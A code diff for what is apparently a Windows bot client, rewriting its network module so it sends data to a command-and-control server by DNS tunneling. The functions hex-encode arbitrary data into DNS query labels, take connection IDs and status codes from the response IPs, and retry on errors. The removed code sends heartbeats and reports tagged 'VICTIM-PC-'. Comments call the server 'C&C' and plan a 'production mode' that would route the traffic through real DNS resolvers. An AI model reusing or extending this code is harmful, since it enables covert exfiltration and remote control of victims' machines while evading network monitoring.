@@ -1,220 +1,266 @@
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #define WIN32_LEAN_AND_MEAN
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
-#include <ws2tcpip.h>
 #include "Network.h"
-#include "Utilities.h"
 #include <iostream>
 #include <string>
-
-// WinAPI
-#include <iomanip>
 #include <sstream>
-#include <windows.h>
+#include <iomanip>
+#include <winsock2.h>
 #include <windns.h>
-using namespace std;
 
-#pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "Dnsapi.lib") 
+#pragma comment(lib, "Ws2_32.lib")
 
-const char*		SERVER_IP		= "127.0.0.1";
-const char*		BOT_ID			= "VICTIM-PC-";
-const int		SERVER_PORT		= 53;
-	  SOCKET	clientSocket	= INVALID_SOCKET;
-
-string CreateDNSPacket(const string& jsonData) {
-    string packet;
-    uint32_t length = static_cast<uint32_t>(jsonData.length());
-    packet.append(reinterpret_cast<char*>(&length), 4);
-    packet.append(jsonData);
-    return packet;
-}
-
-bool InitializeConnection() {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        cerr << "WSAStartup failed" << endl;
-        return false;
-    }
-
-    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (clientSocket == INVALID_SOCKET) {
-        cerr << "Socket creation failed" << endl;
-        WSACleanup();
-        return false;
-    }
-
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(SERVER_PORT);
-    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
-
-    if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
-        cerr << "Connection failed. Error: " << WSAGetLastError() << endl;
-        closesocket(clientSocket);
-        clientSocket = INVALID_SOCKET;
-        WSACleanup();
-        return false;
-    }
-
-    cout << "Connected to server on port " << SERVER_PORT << endl;
-    return true;
-}
-
-bool SendDataTunnel(const string& data) {
-    if (clientSocket == INVALID_SOCKET) {
-        if (!InitializeConnection()) {
-            return false;
-        }
-    }
-
-    string packet = CreateDNSPacket(data);
-    int result = send(clientSocket, packet.c_str(), static_cast<int>(packet.length()), 0);
-
-    if (result == SOCKET_ERROR) {
-        cerr << "Send failed. Error: " << WSAGetLastError() << endl;
-        closesocket(clientSocket);
-        clientSocket = INVALID_SOCKET;
-        return false;
-    }
-
-    cout << "Data sent (" << result << " bytes)" << endl;
-    return true;
-}
-
-void SendManualInput(const string& content) {
-    string jsonPacket = CreateJsonPacket("DATA_REPORT", "MANUAL", content);
-    cout << "Sending: " << jsonPacket << endl;
-    SendDataTunnel(jsonPacket);
-}
-
-void SendHeartbeat() {
-    string jsonPacket = CreateJsonPacket("HEARTBEAT", "STATUS", "ONLINE");
-    SendDataTunnel(jsonPacket);
-}
-
+/**
+ * Establishes connection with DNS server via DNS query
+ * 
+ * LOCAL TEST MODE:
+ *   Sends query directly to C&C server (DNS_SERVER_IP = 127.0.0.1)
+ * 
+ * PRODUCTION MODE (Future):
+ *   Sends query to DNS Resolver → Resolver forwards to C&C server
+ * 
+ * Query: a.1.1.1.domain
+ * Returns: Connection ID extracted from last octet of response IP
+ */
 int startConnection(const char* domain) {
-	
-	std::string fullString =  std::string("a.1.1.1.") + domain; // "a.1.1.1."s declares a string with C++17
+	if (!domain) {
+		return -1;
+	}
+
+	std::string fullString = "a.1.1.1.";
+	fullString += domain;
 	const char* pOwnerName = fullString.c_str();
 	WORD wType = DNS_TYPE_A;
-	PDNS_RECORD pDnsRecord;
-	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));	// Allocate memory for the DNS server list. IP4_ARRAY contains 1 IP address.
-
+	PDNS_RECORD pDnsRecord = nullptr;
+	
+	// ==========================================
+	// LOCAL TEST MODE: Direct to C&C Server
+	// ==========================================
+	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
 	if (!pSrvList) {
-		std::cerr << "Error allocating memory for DNS server list." << std::endl;
 		return -1;
 	}
 
-	pSrvList->AddrCount = 1;	// Only use 1 custom DNS server.
-	pSrvList->AddrArray[0] = inet_addr(CUSTOM_DNS_SERVER_IP);	// Convert IP string to numeric DWORD (IP4_ADDRESS)
-
+	pSrvList->AddrCount = 1;
+	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
 	
-	DNS_STATUS status = DnsQuery_A
-	(
+	DNS_STATUS status = DnsQuery_A(
 		pOwnerName,
 		wType,
-		dns_options,
-		&pSrvList,
+		DNS_OPTIONS,
+		pSrvList,
 		&pDnsRecord,
 		nullptr
-	);  // sends two requests for some reason?
+	);
 	
-	// Free the memory allocated to the server list after use.
+	LocalFree(pSrvList);
+	
+	// ==========================================
+	// PRODUCTION MODE (Future - commented out)
+	// ==========================================
+	// TODO: When using DNS Resolver:
+	/*
+	// Option 1: Use self-hosted DNS Resolver
+	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
 	if (pSrvList) {
-		LocalFree(pSrvList); 
+		pSrvList->AddrCount = 1;
+		pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);  // DNS Resolver IP
+		
+		DNS_STATUS status = DnsQuery_A(
+			pOwnerName,
+			wType,
+			DNS_OPTIONS,
+			pSrvList,
+			&pDnsRecord,
+			nullptr
+		);
+		LocalFree(pSrvList);
 	}
+	
+	// Option 2: Use System DNS (domain must have correct NS records)
+	DNS_STATUS status = DnsQuery_A(
+		pOwnerName,
+		wType,
+		DNS_OPTIONS,
+		nullptr,  // Use system DNS
+		&pDnsRecord,
+		nullptr
+	);
+	*/
 	
 	if (status) {
-		std::cerr << "DnsQuery failed with status: " << status << std::endl;
 		return -1;
-	} else {
-		IN_ADDR ipaddr;
-		ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
-		std::string ipStr = inet_ntoa(ipaddr);
-		DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
-		return std::stoi(ipStr.substr(ipStr.rfind(".") + 1));
 	}
+	
+	if (!pDnsRecord) {
+		return -1;
+	}
+	
+	// Parse response IP - last octet is Connection ID
+	IN_ADDR ipaddr;
+	ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
+	std::string ipStr = inet_ntoa(ipaddr);
+	DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+	
+	size_t lastDot = ipStr.rfind(".");
+	if (lastDot == std::string::npos) {
+		return -1;
+	}
+	
+	int connectionId = std::stoi(ipStr.substr(lastDot + 1));
+	return connectionId;
 }
 
+/**
+ * Send data via DNS tunneling
+ * 
+ * LOCAL TEST MODE:
+ *   Sends directly to C&C server
+ * 
+ * PRODUCTION MODE (Future):
+ *   Sends to DNS Resolver → Resolver forwards to C&C
+ * 
+ * Format: b.packetNum.connectionId.hexData.domain
+ * Response IP first octet = status code
+ */
 int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
+	if (!domain || !data) {
+		return -1;
+	}
+
 	std::ostringstream fullStream;
 	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
 	std::string full = fullStream.str();
 	const char* pOwnerName = full.c_str();
-	std::cout << pOwnerName << std::endl;
-	const WORD wType = DNS_TYPE_A;
+	
+	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
+	
+	// ==========================================
+	// LOCAL TEST MODE: Direct to C&C Server
+	// ==========================================
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
 	if (!pSrvList) {
-		return -1; // fail
+		return -1;
 	}
+
 	pSrvList->AddrCount = 1;
-	pSrvList->AddrArray[0] = inet_addr(CUSTOM_DNS_SERVER_IP);
+	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
 	
 	DNS_STATUS status;
-	int retCode = -1; // The default return code is failure
+	int retCode = -1;
 	
-	// retry 5 times, then give up this message
-	for (int i = 0; i < 5; i++) {
-		pDnsRecord = nullptr; // Reset the cursor each iteration
-		status = DnsQuery_A
-		(
+	// Retry up to 3 times (reduced from 5)
+	for (int i = 0; i < 3; i++) {
+		pDnsRecord = nullptr;
+		
+		status = DnsQuery_A(
 			pOwnerName,
 			wType,
-			dns_options,
+			DNS_OPTIONS,
 			pSrvList,
 			&pDnsRecord,
 			nullptr
 		);
 		
+		// ==========================================
+		// PRODUCTION MODE (Future - commented out)
+		// ==========================================
+		// TODO: When using DNS Resolver, replace DnsQuery_A above with:
+		/*
+		// Use DNS Resolver
+		status = DnsQuery_A(
+			pOwnerName,
+			wType,
+			DNS_OPTIONS,
+			pSrvList,  // DNS Resolver IP
+			&pDnsRecord,
+			nullptr
+		);
+		
+		// Or use System DNS (if domain has NS records configured)
+		status = DnsQuery_A(
+			pOwnerName,
+			wType,
+			DNS_OPTIONS,
+			nullptr,  // System DNS
+			&pDnsRecord,
+			nullptr
+		);
+		*/
+		
 		if (!status && pDnsRecord) {
 			IN_ADDR ipaddr;
-			ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
+			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
 			std::string ipStr = inet_ntoa(ipaddr);
-			DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
+			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
 			
-			int code = std::stoi(ipStr.substr(0, ipStr.find(".")));
-			std::cout << "Response Code: " << code << std::endl;
+			// First octet = response code
+			size_t firstDot = ipStr.find(".");
+			if (firstDot == std::string::npos) {
+				goto cleanup;
+			}
+			
+			int code = std::stoi(ipStr.substr(0, firstDot));
+			
 			switch (code) {
-				case 200:  // processed normally
+				case 200:  // OK - processed normally
 					retCode = 0;
 					goto cleanup;
-				case 201:  // malformed
+					
+				case 201:  // Malformed packet
 					break;
-				case 202:  // connection non-existent
+					
+				case 202:  // Connection non-existent - need to reconnect
 					{
-						int new_id = startConnection(TARGET.c_str());
+						int new_id = startConnection(domain);
 						if (new_id != -1) {
 							id = new_id;
 						}
 					}
-					i--;
+					i--;  // Don't count this retry
 					break;
-				case 203:  // out of order packets
+					
+				case 203:  // Out of order packets - reset
 					packetNumber = 0;
-					i--;
+					i--;  // Don't count this retry
 					break;
-				case 204:  // max connections
-				default:  // unknown error
-					return -1;
+					
+				case 204:  // Max connections reached
+					goto cleanup;
+					
+				default:   // Unknown error
+					goto cleanup;
 			}
 		}
-		Sleep(500);
+		
+		Sleep(200);  // Reduced from 500ms to 200ms
 	}
 	
-	cleanup:
-		if (pSrvList) {
-			LocalFree(pSrvList);
-		}
+cleanup:
+	if (pSrvList) {
+		LocalFree(pSrvList);
+	}
 	return retCode;
 }
 
+/**
+ * Convert string to hex encoding for DNS tunneling
+ * Example: "Hello" -> "48656c6c6f"
+ */
 std::string convertToHex(const char* string) {
-	std::ostringstream out;
-	out << std::hex << std::setfill('0') << std::setw(2);
-	for (const char* i = string; *i; i++) {
-		out << std::setw(2) << static_cast<unsigned>(*i);
+	if (!string) {
+		return "";
 	}
+
+	std::ostringstream out;
+	out << std::hex << std::setfill('0');
+	
+	for (const char* i = string; *i; i++) {
+		out << std::setw(2) << static_cast<unsigned>(static_cast<unsigned char>(*i));
+	}
+	
 	return out.str();
 }
